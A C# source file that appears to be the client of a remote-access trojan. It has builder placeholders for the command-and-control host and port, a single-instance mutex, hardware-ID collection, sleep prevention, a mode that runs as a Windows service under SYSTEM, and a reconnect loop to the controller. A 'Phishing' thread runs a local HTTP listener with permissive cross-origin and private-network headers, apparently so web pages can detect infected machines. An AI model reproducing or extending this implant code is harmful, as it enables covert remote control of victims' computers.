using System;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.ServiceProcess;
using System.Threading;
using Client.HandlePacket;

namespace Client
{
    internal class Program
    {
        #region Setting

        public static readonly string Version = "0.0.1";
#if DEBUG
        public static readonly string Link = "";
        public static readonly string Host = "127.0.0.1";
        public static readonly int Port = 8848;
        public static readonly string Mutex = "Mutex_qwqdanchun";
        public static readonly string Group = "Default";
        public static readonly int Sleep = 1000;
#else
        public static readonly string Link = "%Link%";
        public static readonly string Host = "%Host%";
        public static readonly int Port = Convert.ToInt32("%Port%");
        public static readonly string Mutex = "%Mutex%";
        public static readonly string Group = "%Group%";
        public static readonly int Sleep = Convert.ToInt32("%Sleep%");
#endif

        #endregion

        public static string HWID;
        public static TCPSocket TCP_Socket;
        public static bool ClientWorking;

        private static void Main()
        {
            if (Environment.UserName.ToLower() == "system" && Helper.Helper.CheckSession0())
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new Helper.Service()
                };
                ServiceBase.Run(ServicesToRun);
                return;
            }

            Thread.Sleep(Sleep);

            Start();
        }

        public static void Start()
        {

            //Init
            ClientWorking = true;
            HWID = Helper.Helper.GetHWID();

            //Mutex
            if (!Helper.Helper.CreateMutex()) Environment.Exit(0);

            Helper.Helper.PreventSleep();

            new Thread(() => { Phishing(); }).Start();

            //Connection
            TCP_Socket = new TCPSocket();
            TCP_Socket.InitializeClient();
            while (ClientWorking)
            {
                if (!TCP_Socket.IsConnected) TCP_Socket.Reconnect();

                Thread.Sleep(new Random().Next(5000));
            }
        }

        public static void Phishing()
        {
            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            TcpListener listener = new TcpListener(ipAddress, 23333);
            listener.Start();

            while (true)
            {
                try
                {
                    using (var clt = listener.AcceptTcpClient())
                    using (NetworkStream ns = clt.GetStream())
                    using (StreamReader sr = new StreamReader(ns))
                    using (StreamWriter sw = new StreamWriter(ns))
                    {
                        var msg = sr.ReadLine();

                        if (msg.StartsWith("GET"))
                        {
                            sw.WriteLine("HTTP/1.1 200 OK");
                            sw.WriteLine("Access-Control-Allow-Origin: *");
                            sw.WriteLine("Access-Control-Allow-Private-Network:true");
                            sw.WriteLine();
                            sw.WriteLine("test");
                        }
                    }
                }
                catch { }
                Thread.Sleep(1);
            }
        }
    }
}